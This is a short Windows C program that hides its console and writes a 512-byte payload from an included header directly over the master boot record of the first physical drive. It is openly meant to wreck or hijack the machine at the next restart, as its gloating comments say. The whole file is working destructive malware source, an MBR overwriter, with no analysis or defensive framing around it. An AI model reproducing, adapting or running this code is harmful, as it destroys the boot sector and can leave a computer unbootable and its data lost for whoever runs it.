#include <windows.h> //HANDLE, CreateFile, FreeConsole, DWORD, Writefile and CloseHandle.
#include "code.h"    //rawData.

int main() {
	FreeConsole(); //hide the console.
	HANDLE hDrive = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL); //Open the MBR.
	DWORD w;
	WriteFile(hDrive, rawData, 512, &w, NULL); //Write our dear program to the MBR lol :P
	CloseHandle(hDrive); //close it...
	//GOODBYE!!!!!!!!!!!!!!!!!!!(in the next restart).
}
